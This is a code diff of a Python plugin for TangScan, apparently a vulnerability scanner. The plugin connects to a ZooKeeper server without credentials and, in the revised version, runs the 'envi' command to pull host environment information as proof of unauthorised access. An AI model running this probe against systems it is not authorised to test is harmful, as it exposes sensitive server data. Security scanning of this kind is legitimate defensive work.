@@ -1,37 +1,35 @@
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
+
 """
-Copyright (c) 2013-2014 TangScan developers (http://www.wooyun.org/)
-author: PyNerd <8517172@qq.com>
 """
 
 from __future__ import print_function, absolute_import
-
 from kazoo.client import KazooClient
-
 from modules.exploit import TSExploit
 
-import datetime
-
-__all__ = ['TangScan']
-
+__all__ = ['Tangscan']
 
 class TangScan(TSExploit):
     def __init__(self):
         super(self.__class__, self).__init__()
         self.info = {
-            "name": "zookeeper 未授权访问",
+            "name": "zookeeper 未授权访问漏洞",
             "product": "zookeeper",
             "product_version": "all",
             "desc": """
-                zookeeper 存在未授权访问, 可导致敏感数据泄漏
+                zookeeper 未授权访问, 可能导致敏感数据泄漏
             """,
             "license": self.license.TS,
             "author": "PyNerd",
+            "ref": [
+                {self.ref.url: ""}
+            ],
             "type": self.type.misconfiguration,
             "severity": self.severity.medium,
             "privileged": False,
-            "disclosure_date": datetime.datetime.now().strftime("%Y-%m-%d"), 
-            "create_date": datetime.datetime.now().strftime("%Y-%m-%d") 
+            "disclosure_date": "2010-01-01",
+            "create_date": "2015-12-1"
         }
 
         self.register_option({
@@ -70,15 +68,20 @@ class TangScan(TSExploit):
         host = self.option.host
         port = self.option.port
         thost = host + ":" + str(port)
-        conn = KazooClient(hosts =thost)
-        conn.start()
-        children = conn.get_children('/')
-        for i in children:
-                item =  conn.get_children('/' + i)
-                for j in item:
-                    self.result.status = True
-                    self.result.result = j
-                    self.result.description = "目标 {host} 的 zookeeper 存在未授权访问%s主机信息:%s{sysinfo}".format(host=self.option.host,sysinfo=j) % ('\n','\n')
+        try:
+            conn = KazooClient(hosts =thost)
+            conn.start()
+            sysinfo = conn.command('envi')
+        except Exception, e:
+            self.result.error = "连接发生错误: {error}".format(error=str(e))
+            return
+
+        self.result.status = True
+        self.result.result = str(sysinfo)
+        self.result.description = "目标 {host} 的 zookeeper 可以未授权访问, 主机名信息: {sysinfo}".format(
+            host=self.option.host,
+            sysinfo=str(sysinfo)
+        )
 
     def exploit(self):
         self.verify()
